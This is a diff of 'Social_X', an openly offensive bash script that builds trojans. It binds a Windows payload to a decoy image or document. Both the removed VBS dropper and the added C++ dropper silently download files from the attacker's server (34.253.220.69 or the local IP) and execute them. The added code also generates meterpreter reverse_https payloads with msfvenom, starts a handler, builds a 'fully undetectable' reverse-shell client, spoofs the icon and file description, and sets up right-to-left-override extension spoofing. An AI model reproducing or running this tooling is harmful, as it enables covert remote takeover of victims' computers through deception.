@@ -5,267 +5,238 @@ yellow=`tput setaf 11`
 purple=`tput setaf 129`   
 reset=`tput sgr0` 
 clear
+if [ $(whoami) != "root" ];then
+        echo -e "${RED}Please run this script with root privilages."
+        echo -e "\n${lightblue}sudo bash setup.sh"
+        exit
+fi
+sudo rm CppCodes/* &> /dev/null
+sudo rm SOCIALX_BACKDOOR/*.exe &> /dev/null
+sudo rm WSGI_Server/Upload_Server/images/* &>/dev/null
+sudo killall -9 xterm 
+checK=$(sudo lsof -i :80)
+if [[ $checK != "" ]];then
+    kill=$(sudo lsof -i :80 | awk '{print $1}' | cut -d "D" -f 2)
+    echo -e "${RED}[!]${purple} Port Number 80 is Already IN USE!!\n"
+    read -p "${blue}[?]${green} Would you like me to kill the related port number?[y/n]" sor
+    if [[ $sor == "y" ]] || [[ $sor == "Y" ]] || [[ $sor == "yes" ]];then
+        sudo killall -9 $kill
+    fi
+fi
+xterm -hold -e "echo -e 'Input Your Root Password\n~Social_X~' && sudo python3 WSGI_Server/Upload_Server/app.py" &> /dev/null &
 function banner(){
     echo ${green}
     figlet Social_X -f banner/larry3d.flf 
     echo ${green} ------------------------------------------------------------------
     echo -e "                         By:Aziz Kaplan" 
-    echo -e "                          Version:1.2" 
+    echo -e "                          Version:2.0" 
     echo ${green} ------------------------------------------------------------------
 }
 
-    
-function cleaner() {
-    rm SOCIALX_EXE/*.exe
-}  
 
 function binder() {
-    cleaner
     clear
     banner
     echo ${RED}
-    echo -e "${red}[!]${yellow}File Name Has To Be Same With The File Name That You Want To Embed Otherwise Tool Will Not Work Properly!" 
     echo ${lightblue}
-    echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Embed(it could be jpg,docx,png etc.)"
-    read -p  "==>" file
-    IN="$file" 
-    set -- "$IN" 
+    echo -e "${green}[+]${lightblue}Enter The File Path That You Want To Embed(it could be jpg,docx,png etc.)"
+    echo -e "\n"
+    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" file_path
+    sudo cp $file_path WSGI_Server/Upload_Server/images/
+    file=$(basename $file_path)
+    IN="$file"
+    set -- "$IN"
     ext_spoof=$(echo $file | cut -d "." -f 2 | rev)
-
+    clear
+    banner
     echo "${purple}[+]${green} Have You Created A Backdoor?(Y/N or yes/no)"
-    read  -p "==>" ask
+    echo -e "\n"
+    read  -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" ask
 
     if [[ $ask == "y" || $ask == "yes" || $ask == "YES" || $ask == "Y" ]]
         then
-            echo -e "${red}[!]${yellow}File Name Has To Be Same With The File Name That You Want To Run Otherwise Tool Will Not Work Properly!" 
-            echo "${green}[+]${lightblue}Enter The File Name That You Want To Run(It is an exe file mostly.)\n"
-            read -p "==>" exe_file
+            clear
+            banner
+            echo "${green}[+]${lightblue}Path Of The Main(Will Be Executed) File:"
+            echo -e "\n"
+            read -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" exe_path
+            exe_file=$(basename $exe_path)
             echo ${lightblue}
-            echo  -e "\n${green}[+]${lightblue}Import The '$file' AND '$exe_file' Files To The Social_X Server"
-            checker=$(curl http://34.253.220.69/$file -s | grep 404)
-            if [[ $checker = "<title>404 Not Found</title>"  ]];then 
-                    echo "${green}[+]This Name Is Available For File $file"
-                    echo "${green}[+]${lightblue}Import The '$file' and '$exe_file' to socialx server."
-                    chromium http://socialx-project.ml  2> /dev/null 
-            else
-                    echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $file"
-                    exit
-            fi
-            checker1=$(curl http://34.253.220.69/$exe_file -s | grep 404)
-            if [[ $checker1 = "<title>404 Not Found</title>"  ]];then 
-                    echo "${green}[+]This Name Is Available:$exe_file"
-            else
-                    echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $exe_file"
-                    exit
-            fi
+            sudo cp $exe_path WSGI_Server/Upload_Server/images/
 
-           
     elif [[ $ask == "n" || $ask == "no" || $ask == "NO"  || $ask == "N" ]] ;then
-        echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Run[Input The Name With Extension]\n"
-        read -p "==>" exe_file
         clear
         banner
-        checker=$(curl http://34.253.220.69/$file -s | grep 404) 
+        echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Run[Input The Name With Extension]\n"
+        read -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" exe_file
+        clear
+        banner
+        checker=$(curl http://$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')/$file -s | grep 404) 
         if [[ $checker = "<title>404 Not Found</title>"  ]];then 
             echo "${green}[+]This Name Is Available For File $file"
         else
             echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $file"
             exit
         fi
-            checker1=$(curl http://34.253.220.69/$exe_file -s | grep 404)
+            checker1=$(curl http://$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')/$exe_file -s | grep 404)
         if [[ $checker1 = "<title>404 Not Found</title>"  ]];then 
             echo "${green}[+]This Name Is Available:$exe_file"
             clear
             banner
             echo -e "${green} [#]${lightblue}Choose A Backdoor Option:"
-            echo -e "${green} |1|->${lightblue}Socialx Exe Trojan(FUD-IT IS NOT DETECTABLE[Aziz's Fresh Algorithm])\n"
+            echo -e "${green} |1|->${lightblue}Reverse Shell([Fully Undetectable])\n"
             echo -e "${green} |2|->${lightblue}Metasploit Exe Trojan(NOT FUD-IT IS DETECTABLE)"
-            echo -e "${green} |3|->${lightblue}Metasploit Hta Trojan(NOT FUD-IT IS DETECTABLE)"
-            read -p "${purple}==>" backdoor_option
-            if [[ $backdoor_option = "3"  ]];then
-
-                private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
-                read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
-                read -p "${green}[+]${lightblue}LPORT-->" port
-                if [[ $ip = "" ]];then
-                    echo use exploit/windows/misc/hta_server > Metasploit/socialx.rc
-                    echo set SRVHOST $private_ip >> Metasploit/socialx.rc
-                    echo set URIPATH socialx >> Metasploit/socialx.rc
-                    echo set PAYLOAD windows/meterpreter/reverse_tcp >> Metasploit/socialx.rc
-                    echo set LHOST $private_ip >> Metasploit/socialx.rc
-                    echo set LPORT $port >> Metasploit/socialx.rc
-                    echo exploit -j -z >> Metasploit/socialx.rc
-                else
-                    echo use exploit/windows/misc/hta_server > Metasploit/socialx.rc
-                    echo set SRVHOST $ip >> Metasploit/socialx.rc
-                    echo set URIPATH socialx >> Metasploit/socialx.rc
-                    echo set PAYLOAD windows/meterpreter/reverse_tcp >> Metasploit/socialx.rc
-                    echo set LHOST $ip >> Metasploit/socialx.rc
-                    echo set LPORT $port >> Metasploit/socialx.rc
-                    echo exploit -j -z >> Metasploit/socialx.rc
-                fi
-                echo -e "${green}[+]${lightblue}Your Trojan IS in SOCIALX_BACKDOOR/ directory."
-                
-                echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
-                chmod 755 socialx_backdoor.sh
-                echo -e "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
-		 xterm -hold -e ./socialx_backdoor.sh &
-                sleep 25
-                curl http://$private_ip:8080/socialx/socialx.hta -o $exe_file
+            read -p "${purple}${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" backdoor_option
+            
+            if [[ $backdoor_option = "2" ]];then
+				exe_file="Search.exe"
                 clear
                 banner
-                echo "${green}[+]${lightblue}Your Backdoor Has To Be In The Social_X/ Folder."
-                #wine /home/kali/.wine/drive_c/Program\ Files\ \(x86\)/dennisbabkin.com/Script\ Encoder\ Plus/ScrEncGui.exe /dev/null 2> /dev/null 
-                zip $exe_file.zip $exe_file
-                rm $exe_file
-                cp $exe_file.zip SOCIALX_BACKDOOR/
-                rm $exe_file
-                rm *.zip
-                chromium http://socialx-project.ml  2> /dev/null 
-            elif [[ $backdoor_option = "2" ]];then
                 private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
                 read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
                 read -p "${green}[+]${lightblue}LPORT-->" port
                 
 
                 if [[ $ip = "" ]];then
-                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
+                    cd SOCIALX_BACKDOOR/ 
+                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > $exe_file
+                    cd ../
                     echo use exploit/multi/handler > Metasploit/socialx.rc
                     echo set LHOST $private_ip >> Metasploit/socialx.rc
                     echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                     echo set LPORT $port >> Metasploit/socialx.rc
                     echo exploit -j -z >> Metasploit/socialx.rc
                 else
-                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
+                    cd SOCIALX_BACKDOOR/ 
+                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > $exe_file
+                    cd ../
                     echo use exploit/multi/handler > Metasploit/socialx.rc
                     echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                     echo set LHOST $ip >> Metasploit/socialx.rc
                     echo set LPORT $port >> Metasploit/socialx.rc
                     echo exploit -j -z >> Metasploit/socialx.rc
                 fi
-                echo -e "${green}[+]${lightblue}Your Trojan IS in SOCIALX_BACKDOOR/ directory."
                 
                 echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                 chmod 755 socialx_backdoor.sh
-		echo "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
                 xterm -hold -e ./socialx_backdoor.sh &
                 clear
                 banner
-                chromium http://socialx-project.ml  2> /dev/null 
+                sudo mv SOCIALX_BACKDOOR/*.exe WSGI_Server/Upload_Server/images/Search.exe
+              
+                
+        
             elif [[ $backdoor_option = "1"  ]];then
-                python PYTHON/socialx_encrypter.py
-                sleep 5
-                wine $HOME/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile PYTHON/socialx_backdoor.py
-                cp dist/socialx_backdoor.exe SOCIALX_BACKDOOR/
-                rm *.spec
-                rm PYTHON/*.spec
-                rm -r dist/ build/
-                mv SOCIALX_BACKDOOR/socialx_backdoor.exe SOCIALX_BACKDOOR/$exe_file
+                exe_file="Search.exe"
                 clear
                 banner
-                xterm -hold -e python PYTHON/server.py &
-                echo "${green}[+]Upload The $exe_file and $file to the socialx server."
-                echo "${green}[+]You have to wait until you see the 'File Has Been Sucessfully Uploaded' page."
-                chromium http://socialx-project.ml  2> /dev/null 
+                read -p "${green}[+]${lightblue} LHOST/RHOST[default:$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')]:" host
+                if [[ $host == "" ]];then
+                    ipAddr=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
+                else
+                    ipAddr=$host
+                fi
 
+                read -p "${green}[+]${lightblue} PORT[default:4444]" port
+                if [[ $host == "" ]];then
+                    porT=4444
+                else
+                    porT=$port
+                fi
+                echo "f='$ipAddr'" > reverseShell/ipPort.py
+                echo "f1=$porT" >> reverseShell/ipPort.py
+                sleep 5
+                cd reverseShell/ && wine $HOME'/.wine/drive_c/users/'$(whoami)'/Local Settings/Application Data/Programs/Python/Python36-32/Scripts/pyinstaller.exe' --hidden-import socket,os,subprocess,pyautogui --icon ../banner/icon.ico --onefile --upx-dir upx-3.96-win32/upx.exe -w client.py
+                cd ../
+        
+                cp reverseShell/dist/client.exe SOCIALX_BACKDOOR/
+                rm -r reverseShell/*.spec reverseShell/__pycache__ reverseShell/build/ reverseShell/dist/
+                mv SOCIALX_BACKDOOR/client.exe SOCIALX_BACKDOOR/$exe_file
+                sudo cp SOCIALX_BACKDOOR/$exe_file WSGI_Server/Upload_Server/images/
+                sudo cp $file_path WSGI_Server/Upload_Server/images/
+                
+                clear
+                banner
+                xterm -hold -e "cd reverseShell/ && python3 server.py" &> /dev/null &
             fi
-
         else
                 echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $exe_file"
                 exit
         fi
         
     fi
-    visualbasic
-    ########################################################################################################################
-    echo -e ${yellow}"\n[+]Vbs To Exe Will Be Started Make The Necesarry Changes.\n"
-    echo  -e "\n${RED}[!]${lightblue}PLEASE CONVERT THE FILE IN 'Social_X/SOCIALX_EXE/' FOLDER OTHERWISE TOOL WILL NOT WORK PROPERLY!"
-    sleep 7
-    wine $HOME/.wine/dosdevices/c:/Program\ Files/Vbs\ To\ Exe/Vbs_To_Exe.exe /dev/null 2> /dev/null  
-    mv SOCIALX_EXE/*.exe SOCIALX_EXE/socialx$ext_spoof.exe
-    look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)
-
-    left2right
-  
+    Cpp
     clear
     banner
-    #echo  -e "${green}[+]${lightblue}Socialx Recommends You To Make Some Changes In The Hex Code Of The Winrar Zipped File For A Better Social Engineering."
-    #echo  -e "${green}[+]${lightblue}1-)You Should Go To End Of The Hex Code Line"
-    #echo  -e "${green}[+]${lightblue}2-)You Should Change The '.exe' Extenstion To The Extension That You Want Victim To See."    
-    #echo "${RED}[!]${green}Do You Want To Use Hex Code Editor?"
-    #read -p "->" hex
-    #if [[ $hex == "y" || $hex == "yes" || $hex == "Y" || $hex == "YES" ]];then
-    #    echo "${green} -------------------------------------------"
-    #    echo  -e "${green}  [1]${lightblue}Hexcurse[CLI]"
-    #    echo  -e "${green}  [2]${lightblue}Hexeditor[CLI]"
-    #    echo  -e "${green}  [3]${lightblue}Okteta[GUI-EASY USAGE]"
-    #    echo -e "${green} -------------------------------------------\n"
-    #    read -p "${yellow} ==>" hex_editor
-    #    case $hex_editor in 
-    #        "1")
-    #            hexcurse SOCIALX_EXE/*.zip ;;
-    #        "2")
-    #            hexeditor SOCIALX_EXE/*.zip ;;
-    #        "3")
-    #            okteta SOCIALX_EXE/*.zip ;;
-    #        *)
-    #            echo "EXITING..."
-    #            exit
-    #    esac
-    #fi
-
-    ########################################################################################################################
-
+    echo -e ${yellow}"\n[+]Dev-C++ Will Be Started. Compile the .cpp file\n"
+    echo  -e "\n${RED}[!]${lightblue}PLEASE CONVERT THE FILE IN 'Social_X/CppCodes/' FOLDER OTHERWISE TOOL WILL NOT WORK PROPERLY!"
+    sleep 4
+    wine $HOME'/.wine/drive_c/Program Files (x86)/Dev-Cpp/devcpp.exe'
+    clear
+    banner
+    echo -e "${green}[+]${lightblue}Enter a file description to the malicious file:\n "
+    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" desc
+    clear 
+    banner
+    echo -e "${green}[+]${lightblue}Enter the path of icon file:\n"
+    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" icon
+    clear
+    banner
+    mv CppCodes/*.exe CppCodes/lif$ext_spoof.exe
+    cd CppCodes/
+    sudo wine64 ../RCedit/rcedit-x64.exe lif$ext_spoof.exe --set-version-string FileDescription $desc --set-icon $icon &> /dev/null
+    sudo cp lif$ext_spoof.exe ../WSGI_Server/Upload_Server/images/
+    look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)
+    left2right
+    cd ../
+    clear
+    banner
 }
-function visualbasic() {     
-    binder_vbs_code='set oShell = CreateObject ("Wscript.Shell")'
-    binder_vbs_code1='Dim strArgs'
-    binder_vbs_code2='Dim strArgs1'
-    binder_vbs_code3='Dim strArgs2'
-    binder_vbs_code4='Dim strArgs3'
-    binder_vbs_code5='Dim strArgs4'
-    binder_vbs_code6='strArgs = "cmd /c curl http://34.253.220.69/'$file' -o %homepath%/AppData/Local/Temp/'$file'"'
-    binder_vbs_code7='strArgs1 = "cmd /c curl http://34.253.220.69/wget.exe -o %homepath%/AppData/Local/Temp/wget.exe"'
-    binder_vbs_code8='strArgs2 = "%homepath%\AppData\Local\Temp\wget.exe -P %homepath%/AppData/Local/Temp/ http://34.253.220.69/'$exe_file'"'
-    binder_vbs_code9='strArgs3 = "cmd /c start %homepath%/AppData/Local/Temp/'$file'"'
-    binder_vbs_code10='strArgs4 = "powershell %homepath%/AppData/Local/Temp/'$exe_file'"'
-    binder_vbs_code11='oShell.Run strArgs, 0, false'
-    binder_vbs_code12='WScript.Sleep(2000)'
-    binder_vbs_code13='oShell.Run strArgs3, 0, false'
-    binder_vbs_code14='WScript.Sleep(2000)'
-    binder_vbs_code15='oShell.Run strArgs1, 0, false'
-    binder_vbs_code16='WScript.Sleep(20000)'
-    binder_vbs_code17='oShell.Run strArgs2, 0, false'
-    binder_vbs_code18='WScript.Sleep(180000)'
-    binder_vbs_code19='oShell.Run strArgs4, 0, false'
+function Cpp() {
+    ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
+    CppCode='#include <iostream>'
+    CppCode1='#include <unistd.h>'
+    CppCode2='#include <windows.h>'
+    CppCode3='using namespace std;'
+    CppCode4='int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){'
+    CppCode5='ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);'
+    CppCode6='system("cmd /c curl http://'$ip'/images/'$file' -o %homepath%/AppData/Local/Temp/'$file'");'
+    CppCode7='system("cmd /c curl http://'$ip'/images/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'");'
+    CppCode8='usleep(3000);'
+    CppCode9='system("cmd /c start %homepath%/AppData/Local/Temp/'$file'");'
+    CppCode10='usleep(3000);'
+    CppCode11='system("cmd /c curl http://'$ip'/images/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'");'
+    CppCode12='system("powershell %homepath%/AppData/Local/Temp/'$exe_file'");'
+    CppCode13='FreeConsole();'
+    CppCode14='return 0;'
+    CppCode15='}'
     
-    ########################################################################################################################
-    echo $binder_vbs_code > SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code1 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code2 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code3 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code4 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code5 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code6 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code7 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code8 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code9 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code10 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code11 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code12 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code13 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code14 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code15 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code16 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code17 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code18 >> SOCIALX_VBS/socialx.vbs
-    echo $binder_vbs_code19 >> SOCIALX_VBS/socialx.vbs
+    echo $CppCode > CppCodes/socialx.cpp
+    echo $CppCode1 >> CppCodes/socialx.cpp
+    echo $CppCode2 >> CppCodes/socialx.cpp
+    echo $CppCode3 >> CppCodes/socialx.cpp
+    echo $CppCode4 >> CppCodes/socialx.cpp
+    echo $CppCode5 >> CppCodes/socialx.cpp
+    echo $CppCode6 >> CppCodes/socialx.cpp
+    echo $CppCode7 >> CppCodes/socialx.cpp
+    echo $CppCode8 >> CppCodes/socialx.cpp
+    echo $CppCode9 >> CppCodes/socialx.cpp
+    echo $CppCode10 >> CppCodes/socialx.cpp
+    echo $CppCode11 >> CppCodes/socialx.cpp
+    echo $CppCode12 >> CppCodes/socialx.cpp
+    echo $CppCode13 >> CppCodes/socialx.cpp
+    echo $CppCode14 >> CppCodes/socialx.cpp
+    echo $CppCode15 >> CppCodes/socialx.cpp
+    
 }
 function left2right() {
     echo "${green}[+]${lightblue}Chromium Will Be Opened.Please Click To ${RED}COPY ${lightblue} Button."
-    chromium https://unicode.flopp.net/c/202E /dev/null 2> /dev/null 
+    chromium http://unicode.flopp.net/c/202E /dev/null 2> /dev/null 
 }
 
 binder
+echo -e "${lightblue}[+]${green} Thanks for using Social_X :) <3"
+echo -e "${lightblue}[+]${green} https://github.com/AzizKpln"
+echo -e "${lightblue}[+]${green} Youtube:Aziz Kaplan"
 
     
